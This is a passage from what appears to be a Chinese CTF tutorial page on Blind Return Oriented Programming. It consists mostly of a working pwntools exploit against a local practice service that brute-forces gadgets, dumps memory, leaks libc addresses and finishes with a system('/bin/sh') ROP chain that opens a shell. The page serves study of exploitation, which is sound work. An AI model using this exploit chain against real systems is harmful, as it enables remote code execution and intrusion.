        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stop_addr</span><span class="p">)</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">10001</span><span class="p">)</span>
            <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
            <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
            <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
            <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
            <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;find address: 0x</span><span class="si">%x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">addr</span><span class="p">)</span>
            <span class="k">try</span><span class="p">:</span>    <span class="c1"># check</span>
                <span class="n">payload</span>  <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="n">buf_size</span>
                <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
                <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>

                <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">10001</span><span class="p">)</span>
                <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
                <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
                <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
                <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
                <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;bad address: 0x</span><span class="si">%x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">addr</span><span class="p">)</span>
            <span class="k">except</span><span class="p">:</span>
                <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
                <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;gadget address: 0x</span><span class="si">%x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">addr</span><span class="p">)</span>
                <span class="k">return</span> <span class="n">addr</span>
        <span class="k">except</span> <span class="ne">EOFError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
            <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;bad: 0x</span><span class="si">%x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">addr</span><span class="p">)</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;Can&#39;t connect&quot;</span><span class="p">)</span>
            <span class="n">addr</span> <span class="o">-=</span> <span class="mi">1</span>

<span class="k">def</span> <span class="nf">get_puts_plt</span><span class="p">(</span><span class="n">buf_size</span><span class="p">,</span> <span class="n">stop_addr</span><span class="p">,</span> <span class="n">gadgets_addr</span><span class="p">):</span>
    <span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">gadgets_addr</span> <span class="o">+</span> <span class="mi">9</span>      <span class="c1"># pop rdi; ret;</span>
    <span class="n">addr</span> <span class="o">=</span> <span class="n">stop_addr</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
        <span class="n">addr</span> <span class="o">+=</span> <span class="mi">1</span>

        <span class="n">payload</span>  <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="n">buf_size</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stop_addr</span><span class="p">)</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">10001</span><span class="p">)</span>
            <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
            <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\x7f</span><span class="s2">ELF&quot;</span><span class="p">):</span>
                <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;puts@plt address: 0x</span><span class="si">%x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">addr</span><span class="p">)</span>
                <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
                <span class="k">return</span> <span class="n">addr</span>
            <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;bad: 0x</span><span class="si">%x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">addr</span><span class="p">)</span>
            <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
        <span class="k">except</span> <span class="ne">EOFError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
            <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;bad: 0x</span><span class="si">%x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">addr</span><span class="p">)</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;Can&#39;t connect&quot;</span><span class="p">)</span>
            <span class="n">addr</span> <span class="o">-=</span> <span class="mi">1</span>

<span class="k">def</span> <span class="nf">dump_memory</span><span class="p">(</span><span class="n">buf_size</span><span class="p">,</span> <span class="n">stop_addr</span><span class="p">,</span> <span class="n">gadgets_addr</span><span class="p">,</span> <span class="n">puts_plt</span><span class="p">,</span> <span class="n">start_addr</span><span class="p">,</span> <span class="n">end_addr</span><span class="p">):</span>
    <span class="n">pop_rdi</span>  <span class="o">=</span> <span class="n">gadgets_addr</span> <span class="o">+</span> <span class="mi">9</span>     <span class="c1"># pop rdi; ret</span>

    <span class="n">result</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
    <span class="k">while</span> <span class="n">start_addr</span> <span class="o">&lt;</span> <span class="n">end_addr</span><span class="p">:</span>
        <span class="c1">#print result.encode(&#39;hex&#39;)</span>
        <span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
        <span class="n">payload</span>  <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="n">buf_size</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">start_addr</span><span class="p">)</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stop_addr</span><span class="p">)</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">10001</span><span class="p">)</span>
            <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
            <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
            <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mf">0.1</span><span class="p">)</span>      <span class="c1"># timeout makes sure to recive all bytes</span>
            <span class="k">if</span> <span class="n">data</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">:</span>
                <span class="n">data</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span>
            <span class="k">elif</span> <span class="n">data</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">:</span>
                <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
            <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;leaking: 0x</span><span class="si">%x</span><span class="s2"> --&gt; </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">start_addr</span><span class="p">,(</span><span class="n">data</span> <span class="ow">or</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">)))</span>
            <span class="n">result</span> <span class="o">+=</span> <span class="n">data</span>
            <span class="n">start_addr</span> <span class="o">+=</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
            <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;Can&#39;t connect&quot;</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">result</span>

<span class="k">def</span> <span class="nf">get_puts_addr</span><span class="p">(</span><span class="n">buf_size</span><span class="p">,</span> <span class="n">stop_addr</span><span class="p">,</span> <span class="n">gadgets_addr</span><span class="p">,</span> <span class="n">puts_plt</span><span class="p">,</span> <span class="n">puts_got</span><span class="p">):</span>
    <span class="n">pop_rdi</span>  <span class="o">=</span> <span class="n">gadgets_addr</span> <span class="o">+</span> <span class="mi">9</span>

    <span class="n">payload</span>  <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="n">buf_size</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stop_addr</span><span class="p">)</span>

    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">10001</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x00\x00</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;puts address: 0x</span><span class="si">%x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">data</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

    <span class="k">return</span> <span class="n">data</span>

<span class="c1">#buf_size = get_buffer_size()</span>
<span class="n">buf_size</span> <span class="o">=</span> <span class="mi">72</span>

<span class="c1">#stop_addr = get_stop_addr(buf_size)</span>
<span class="n">stop_addr</span> <span class="o">=</span> <span class="mh">0x4005e5</span>

<span class="c1">#gadgets_addr = get_gadgets_addr(buf_size, stop_addr)</span>
<span class="n">gadgets_addr</span> <span class="o">=</span> <span class="mh">0x40082a</span>

<span class="c1">#puts_plt = get_puts_plt(buf_size, stop_addr, gadgets_addr)</span>
<span class="n">puts_plt</span> <span class="o">=</span> <span class="mh">0x4005e7</span>     <span class="c1"># fake puts</span>
<span class="c1">#puts_plt = 0x4005f0    # true puts</span>

<span class="c1"># dump code section from memory</span>
<span class="c1"># and then use Radare2 or IDA Pro to find the got address</span>
<span class="c1">#start_addr = 0x400000</span>
<span class="c1">#end_addr   = 0x401000</span>
<span class="c1">#code_bin = dump_memory(buf_size, stop_addr, gadgets_addr, puts_plt, start_addr, end_addr)</span>
<span class="c1">#with open(&#39;code.bin&#39;, &#39;wb&#39;) as f:</span>
<span class="c1">#   f.write(code_bin)</span>
<span class="c1">#   f.close()</span>
<span class="n">puts_got</span> <span class="o">=</span> <span class="mh">0x00601018</span>

<span class="c1"># you can also dump data from memory and get information from .got</span>
<span class="c1">#start_addr = 0x600000</span>
<span class="c1">#end_addr   = 0x602000</span>
<span class="c1">#data_bin = dump_memory(buf_size, stop_addr, gadgets_addr, puts_plt, start_addr, end_addr)</span>
<span class="c1">#with open(&#39;data.bin&#39;, &#39;wb&#39;) as f:</span>
<span class="c1">#    f.write(data_bin)</span>
<span class="c1">#    f.close()</span>

<span class="c1"># must close ASLR</span>
<span class="c1">#puts_addr = get_puts_addr(buf_size, stop_addr, gadgets_addr, puts_plt, puts_got)</span>
<span class="n">puts_addr</span> <span class="o">=</span> <span class="mh">0x7ffff7a90210</span>

<span class="c1"># first add your own libc into libc-database: $ ./add /usr/lib/libc-2.26.so</span>
<span class="c1"># $ ./find puts 0x7ffff7a90210</span>
<span class="c1"># or $ ./find puts 210</span>
<span class="c1"># $ ./dump local-e112b79b632f33fce6908f5ffd2f61a5d8058570</span>
<span class="c1"># $ ./dump local-e112b79b632f33fce6908f5ffd2f61a5d8058570 puts</span>
<span class="c1"># then you can get the following offset</span>
<span class="n">offset_puts</span>   <span class="o">=</span> <span class="mh">0x000000000006f210</span>
<span class="n">offset_system</span> <span class="o">=</span> <span class="mh">0x0000000000042010</span>
<span class="n">offset_str_bin_sh</span> <span class="o">=</span> <span class="mh">0x17aff5</span>

<span class="n">system_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">puts_addr</span> <span class="o">-</span> <span class="n">offset_puts</span><span class="p">)</span> <span class="o">+</span> <span class="n">offset_system</span>
<span class="n">binsh_addr</span>  <span class="o">=</span> <span class="p">(</span><span class="n">puts_addr</span> <span class="o">-</span> <span class="n">offset_puts</span><span class="p">)</span> <span class="o">+</span> <span class="n">offset_str_bin_sh</span>

<span class="c1"># get shell</span>
<span class="n">payload</span>  <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="n">buf_size</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">gadgets_addr</span> <span class="o">+</span> <span class="mi">9</span><span class="p">)</span>    <span class="c1"># pop rdi; ret;</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stop_addr</span><span class="p">)</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">10001</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div></p>
<h2 id="_3">参考资料<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<ul>
<li><a href="http://www.scs.stanford.edu/brop/">Blind Return Oriented Programming (BROP)</a></li>
<li><a href="http://ytliu.info/blog/2014/05/31/blind-return-oriented-programming-brop-attack-yi/">Blind Return Oriented Programming (BROP) Attack (1)</a></li>
</ul>
                
                  
                
              
              
                
              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
    <div class="md-footer-nav">
      <nav class="md-footer-nav__inner md-grid">
        
          <a href="../../race-condition/problem/" title="例题" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
            </div>
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  后退
                </span>
                例题
              </span>
            </div>
          </a>
        
        
          <a href="../6.1.2_pwn_njctf2017_pingme/" title="NJCTF2017 pingme" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  前进
                </span>
                NJCTF2017 pingme
              </span>
            </div>
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
            </div>
          </a>
        
      </nav>
    </div>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
        powered by
        <a href="http://www.mkdocs.org">MkDocs</a>
        and
        <a href="https://squidfunk.github.io/mkdocs-material/">
          Material for MkDocs</a>
      </div>
      
        
      
    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../../../assets/javascripts/application.02434462.js"></script>
      
        
        
          
          <script src="../../../assets/javascripts/lunr/lunr.stemmer.support.js"></script>
          
            
              
                <script src="../../../assets/javascripts/lunr/tinyseg.js"></script>
              
              
                <script src="../../../assets/javascripts/lunr/lunr.jp.js"></script>
              
            
          
          
        
      
      <script>app.initialize({version:"0.17.2",url:{base:"../../.."}})</script>
      
        <script src="../../../_static/js/extra.js"></script>
      
        <script src="https://cdn.bootcss.com/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML"></script>
      
    
    
      
    
  </body>
</html>